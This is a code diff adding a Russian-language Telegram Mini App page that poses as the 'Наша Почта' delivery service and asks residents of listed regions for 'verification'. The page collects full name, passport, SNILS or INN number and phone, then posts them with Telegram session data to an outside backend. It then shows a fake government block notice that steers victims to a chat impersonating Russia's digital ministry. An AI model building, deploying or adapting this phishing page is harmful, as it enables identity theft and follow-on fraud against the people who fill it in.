@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Наша Почта — Мобильный сервис</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: #ffffff;
+            margin: 0;
+            color: #1a1a1a;
+        }
+
+        .header-app {
+            background: #ffffff;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 1px solid #f0f0f0;
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+
+        .container-main {
+            padding: 20px;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .icon-png {
+            width: 24px;
+            height: 24px;
+            object-fit: contain;
+        }
+
+        .icon-large {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 20px;
+        }
+
+        .btn-primary {
+            background-color: #e1251b;
+            color: #ffffff;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 16px;
+            transition: opacity 0.2s;
+        }
+
+        .btn-primary:active { opacity: 0.8; }
+
+        .select-card {
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            transition: all 0.2s;
+        }
+
+        .select-card:active {
+            border-color: #e1251b;
+            background-color: #fff5f5;
+        }
+
+        .input-standard {
+            width: 100%;
+            background: #f9fafb;
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        .input-standard:focus {
+            border-color: #e1251b;
+            outline: none;
+            background: #fff;
+        }
+
+        .hidden { display: none !important; }
+        .fade-in { animation: fadeIn 0.3s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
+        .lock-screen {
+            text-align: center;
+            padding: 40px 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header-app">
+        <img src="D1uZUd6jOlQ.jpg" alt="Наша Почта" class="h-16">
+    </header>
+
+    <main class="container-main">
+
+        <div id="welcome" class="fade-in text-center py-10">
+            <img src="https://cdn-icons-png.flaticon.com/512/709/709806.png" class="icon-large" alt="welcome">
+            <h1 class="text-2xl font-bold mb-3">Сервис экспресс-доставки</h1>
+            <p class="text-gray-500 mb-10 text-sm px-4">Для использования личного кабинета необходимо пройти верификацию данных.</p>
+            <button onclick="show('step1')" class="btn-primary">Продолжить</button>
+        </div>
+
+        <div id="step1" class="hidden fade-in">
+            <h2 class="text-xl font-bold mb-6 text-center">Выберите ваш регион</h2>
+            <div class="space-y-3">
+                <div onclick="save('region', 'ДНР'); show('step2')" class="select-card">
+                    <span class="font-medium text-gray-700">Донецкая Народная Республика</span>
+                    <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
+                </div>
+                <div onclick="save('region', 'ЛНР'); show('step2')" class="select-card">
+                    <span class="font-medium text-gray-700">Луганская Народная Республика</span>
+                    <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
+                </div>
+                <div onclick="save('region', 'Запорожье'); show('step2')" class="select-card">
+                    <span class="font-medium text-gray-700">Запорожская область</span>
+                    <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
+                </div>
+                <div onclick="save('region', 'Херсон'); show('step2')" class="select-card">
+                    <span class="font-medium text-gray-700">Херсонская область</span>
+                    <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
+                </div>
+                <div onclick="save('region', 'Крым'); show('step2')" class="select-card">
+                    <span class="font-medium text-gray-700">Республика Крым</span>
+                    <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
+                </div>
+                <div onclick="save('region', 'Ростовская обл.'); show('step2')" class="select-card">
+                    <span class="font-medium text-gray-700">Ростовская область</span>
+                    <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
+                </div>
+            </div>
+        </div>
+
+        <div id="step2" class="hidden fade-in">
+            <h2 class="text-xl font-bold mb-2">Введите ФИО</h2>
+            <p class="text-xs text-gray-400 mb-6">Введите полные данные как в паспорте</p>
+            <input id="name" type="text" placeholder="Фамилия Имя Отчество" class="input-standard" />
+            <button onclick="saveInput('name', 'step3')" class="btn-primary">Далее</button>
+        </div>
+
+        <div id="step3" class="hidden fade-in text-center">
+            <h2 class="text-xl font-bold mb-6">Подтверждение личности</h2>
+            <div class="space-y-3">
+                <div onclick="setDocType('Паспорт')" class="select-card">
+                    <span>Паспорт РФ</span>
+                    <img src="https://cdn-icons-png.flaticon.com/512/2910/2910756.png" class="icon-png" alt="doc">
+                </div>
+                <div onclick="setDocType('СНИЛС')" class="select-card">
+                    <span>СНИЛС</span>
+                    <img src="https://cdn-icons-png.flaticon.com/512/2910/2910756.png" class="icon-png" alt="doc">
+                </div>
+                <div onclick="setDocType('ИНН')" class="select-card">
+                    <span>ИНН</span>
+                    <img src="https://cdn-icons-png.flaticon.com/512/2910/2910756.png" class="icon-png" alt="doc">
+                </div>
+            </div>
+        </div>
+
+        <div id="step4" class="hidden fade-in text-center">
+            <h2 id="docTitle" class="text-xl font-bold mb-6">Номер документа</h2>
+            <input id="docNumber" type="tel" class="input-standard text-center text-lg tracking-widest" oninput="limitDocInput(this)" />
+            <p id="docError" class="text-red-500 text-xs mb-6 hidden">Ошибка в количестве цифр</p>
+            <button onclick="validateDoc()" class="btn-primary">Подтвердить</button>
+        </div>
+
+        <div id="step5" class="hidden fade-in text-center">
+            <h2 class="text-xl font-bold mb-6">Контактный телефон</h2>
+            <input id="phone" type="tel" placeholder="+7 (___) ___-__-__" class="input-standard text-center text-lg" oninput="formatPhone(this)" maxlength="18" />
+            <button onclick="saveInput('phone', 'check')" class="btn-primary">К проверке</button>
+        </div>
+
+        <div id="check" class="hidden fade-in">
+            <h2 class="text-xl font-bold mb-6">Проверьте анкету</h2>
+            <div class="bg-gray-50 p-6 rounded-2xl space-y-4 mb-8">
+                <div class="flex justify-between border-b pb-2"><span class="text-gray-400">Регион:</span><b id="prevRegion"></b></div>
+                <div class="flex justify-between border-b pb-2"><span class="text-gray-400">ФИО:</span><b id="prevName"></b></div>
+                <div class="flex justify-between border-b pb-2"><span class="text-gray-400">Документ:</span><b id="prevDoc"></b></div>
+                <div class="flex justify-between"><span class="text-gray-400">Телефон:</span><b id="prevPhone"></b></div>
+            </div>
+            <button onclick="startFinish()" class="btn-primary">Отправить данные</button>
+        </div>
+
+        <div id="loading" class="hidden fade-in text-center py-20">
+            <div class="w-12 h-12 border-4 border-gray-100 border-t-red-600 rounded-full animate-spin mx-auto mb-6"></div>
+            <p class="font-bold text-gray-500">Связь с базой данных...</p>
+        </div>
+
+        <div id="blocked" class="hidden fade-in lock-screen">
+            <img src="https://cdn-icons-png.flaticon.com/512/1828/1828843.png" class="w-16 h-16 mx-auto mb-6" alt="blocked">
+            <h1 class="text-xl font-bold text-red-600 mb-4 uppercase">БОТ ЗАБЛОКИРОВАН</h1>
+            <div class="text-sm text-gray-600 text-left space-y-4 leading-relaxed mb-8">
+                <p><b>Данный сервис заблокирован Министерством связи и массовых коммуникаций Российской Федерации из-за подозрения в мошенничестве:</b> Ваши персональные данные были переданы по незащищенному каналу. С вами свяжутся представители Минцифр России.</p>
+                <p>Для ускорения процесса разбирательства, напишите в официальный чат поддержки.</p>
+            </div>
+            <a id="supportBtn" href="#" class="block w-full bg-zinc-900 text-white py-4 rounded-xl font-bold text-center">Чат поддержки Минцифры</a>
+        </div>
+
+    </main>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    const urlParams = new URLSearchParams(window.location.search);
+    const botSource = urlParams.get('bot') || 'nashapochta_v3';
+
+    document.getElementById('supportBtn').href = `https://t.me/mincfr_official?text=${encodeURIComponent("Здравствуйте! Мои данные попали в общий доступ в приложении Наша Почта. Требуется помощь!")}`;
+
+    let answers = {};
+
+    function show(id) {
+        ['welcome', 'step1', 'step2', 'step3', 'step4', 'step5', 'check', 'loading', 'blocked'].forEach(s => {
+            const el = document.getElementById(s);
+            if(el) el.classList.add('hidden');
+        });
+        document.getElementById(id).classList.remove('hidden');
+        
+        if (id === 'check') {
+            document.getElementById('prevName').textContent = answers.name || '-';
+            document.getElementById('prevRegion').textContent = answers.region || '-';
+            document.getElementById('prevDoc').textContent = answers.docNumber || '-';
+            document.getElementById('prevPhone').textContent = answers.phone || '-';
+        }
+    }
+
+        function save(key, value) { 
+        // Если сохраняем регион, дублируем его в ключ 'gender' для бэкенда
+        if (key === 'region') {
+            answers['gender'] = value; 
+        }
+        answers[key] = value; 
+        tg.HapticFeedback.impactOccurred('light'); 
+    }
+    
+    function saveInput(id, next) {
+        const val = document.getElementById(id).value.trim();
+        if (!val) { tg.HapticFeedback.notificationOccurred('error'); return; }
+        save(id, val); 
+        show(next);
+    }
+
+    function setDocType(type) {
+        save('docType', type);
+        let title = 'Серия и номер паспорта';
+        if (type === 'СНИЛС') title = 'Номер СНИЛС';
+        if (type === 'ИНН') title = 'Номер ИНН';
+        document.getElementById('docTitle').innerText = title;
+        show('step4');
+    }
+
+    function limitDocInput(input) {
+        let limit = 10;
+        if (answers.docType === 'СНИЛС') limit = 11;
+        if (answers.docType === 'ИНН') limit = 12;
+        input.value = input.value.replace(/[^0-9]/g, '').slice(0, limit);
+    }
+
+    function validateDoc() {
+        const val = document.getElementById('docNumber').value;
+        let exp = 10;
+        if (answers.docType === 'СНИЛС') exp = 11;
+        if (answers.docType === 'ИНН') exp = 12;
+        if (val.length !== exp) { 
+            document.getElementById('docError').classList.remove('hidden'); 
+            return; 
+        }
+        save('docNumber', val); 
+        show('step5');
+    }
+
+    function formatPhone(input) {
+        let v = input.value.replace(/\D/g, '');
+        if (v.startsWith('7') || v.startsWith('8')) v = v.substring(1);
+        let res = '+7';
+        if (v.length > 0) res += ' (' + v.substring(0, 3);
+        if (v.length > 3) res += ') ' + v.substring(3, 6);
+        if (v.length > 6) res += '-' + v.substring(6, 8);
+        if (v.length > 8) res += '-' + v.substring(8, 10);
+        input.value = res.substring(0, 18);
+    }
+
+    async function startFinish() {
+        show('loading');
+        await new Promise(r => setTimeout(r, 2000));
+        finish();
+    }
+
+    function finish() {
+        fetch('https://oms-mini-app-backend-production.up.railway.app/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ ...answers, initDataRaw: tg.initData, bot_label: botSource })
+        }).finally(() => { 
+            tg.HapticFeedback.notificationOccurred('warning'); 
+            show('blocked'); 
+        });
+    }
+
+    window.onload = async () => {
+        if (tg.initData) {
+            try {
+                const res = await fetch('https://oms-mini-app-backend-production.up.railway.app/check_user', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ initDataRaw: tg.initData })
+                });
+                const result = await res.json();
+                if (result.is_blocked) show('blocked');
+            } catch (e) {}
+        }
+    };
+</script>
+</body>
+</html>
